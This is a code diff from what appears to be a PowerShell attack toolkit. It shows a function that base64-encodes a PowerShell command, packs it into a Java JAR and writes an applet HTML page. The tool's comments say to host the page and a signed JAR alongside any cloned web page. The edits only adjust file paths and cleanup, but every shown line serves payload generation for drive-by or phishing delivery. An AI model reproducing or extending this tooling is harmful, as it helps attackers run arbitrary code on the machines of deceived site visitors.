@@ -735,7 +735,7 @@ if (Test-Path "C:\program files\java\") {
 function CreateJavaPayloadTrue
 {
 
-$OutputPath="$pwd"
+$OutputPath = "$global:newdir\payloads"
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
 $payloadraw = [Convert]::ToBase64String($bytes)
 
@@ -787,7 +787,7 @@ Out-File -InputObject $Manifest -Encoding ascii -FilePath $ManifestFile
 
 # create the JAR
 $Jarpath = "$JDKPath" + "\bin\jar.exe"
-& "$JarPath" "-cvfm" "$global:newdir\payloads\JavaPS.jar" "$ManifestFile" "JavaPS.class"|out-null
+& "$JarPath" "-cvfm" "$global:newdir\payloads\JavaPS.jar" "$ManifestFile" "$global:newdir\payloads\JavaPS.class"|out-null
    
 # output simple html. This could be used with any cloned web page.
 # host this HTML and SignedJarPS.jar on a web server.
@@ -801,7 +801,8 @@ $HTMLFile = "$global:newdir\payloads\applet.html"
 Out-File -InputObject $HTMLCode -Encoding ascii -FilePath $HTMLFile   
 
 # cleanup
-Remove-Item "$OutputPath\JavaPS*"
+Remove-Item "$OutputPath\JavaPS.java"
+Remove-Item "$OutputPath\JavaPS.class"
   
 # cleanup to remove temporary files
 Remove-Item "$OutputPath\manifest.txt"
